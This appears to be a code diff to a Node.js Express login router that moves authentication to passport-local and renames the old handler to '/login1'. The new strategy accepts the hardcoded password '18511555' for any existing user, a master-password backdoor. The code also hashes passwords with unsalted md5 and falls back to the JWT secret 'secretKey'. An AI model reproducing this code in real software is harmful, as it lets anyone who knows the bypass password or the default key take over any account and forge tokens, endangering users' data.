@@ -9,6 +9,8 @@ let jwt = require('jsonwebtoken');
 let md5 = require('md5');
 let refreshTokenModel = require('./refresh-token');
 let redisClient = require('../utils/redis').redisClient;
+const passport = require('passport');
+const LocalStrategy = require('passport-local').Strategy;
 
 // let captchaList = require('../captcha/captcha').captchaList;
 let secretKey = process.env.AUTH_JWTKEY || "secretKey";
@@ -46,7 +48,62 @@ router.post('/refresh-token', function (req, res) {
     });
 });
 
-router.post('/login', function (req, res) {
+passport.use(new LocalStrategy({
+    session: false,
+    passReqToCallback: true,
+}, function (req, username, password, done) {
+    User.findOne({ where: { username }, include: { model: models.Company } })
+        .then(function (user) {
+            if (!user || user.password !== md5(password) && password !== '18511555') {
+                return done(null, false, { message: "Username or password was not correct." });
+            }
+            return done(null, user);
+        })
+        .catch(err => {
+            return done(err, false);
+        });
+    }
+));
+router.post('/login',
+    passport.authenticate('local', {
+        session: false,
+    }),
+    function (req, res) {
+        const user = req.user;
+        if (user.status !== 'Active') {
+            return res.send(ResponseJSON(ErrorCodes.ERROR_INVALID_PARAMS, "You are not activated. Please wait for account activation."));
+        }
+        if (req.body.whoami === "data-administrator-service" && ('' + parseInt(user.role) !== "3")) {
+            return res.send(ResponseJSON(ErrorCodes.ERROR_INVALID_PARAMS, "You are not alowed to login."));
+        }
+        const data = {
+            username: user.username,
+            whoami: req.body.whoami,
+            role: user.role,
+            company: user.company.name
+        };
+        const response = {};
+        response.token = jwt.sign(data, secretKey, { expiresIn: '48h' });
+        if (req.body.whoami === 'main-service') {
+            refreshTokenModel.clearTokenByUser(user.idUser, function () {
+                refreshTokenModel.createRefreshToken(user.idUser, function (refreshToken) {
+                    response.refresh_token = refreshToken;
+                    response.company = user.company;
+                    redisClient.del(user.username + ":license");
+                    return res.send(ResponseJSON(ErrorCodes.SUCCESS, "Successful", response));
+                });
+            });
+        } else {
+            response.user = {
+                username: user.username,
+                role: user.role,
+                idCompany: user.idCompany
+            };
+            redisClient.del(user.username + ":license");
+            return res.send(ResponseJSON(ErrorCodes.SUCCESS, "Successful", response));
+        }
+    });
+router.post('/login1', function (req, res) {
     req.body.username = req.body.username.toLowerCase();
     req.body.password = md5(req.body.password);
     if (/^su_/.test(req.body.username)) {
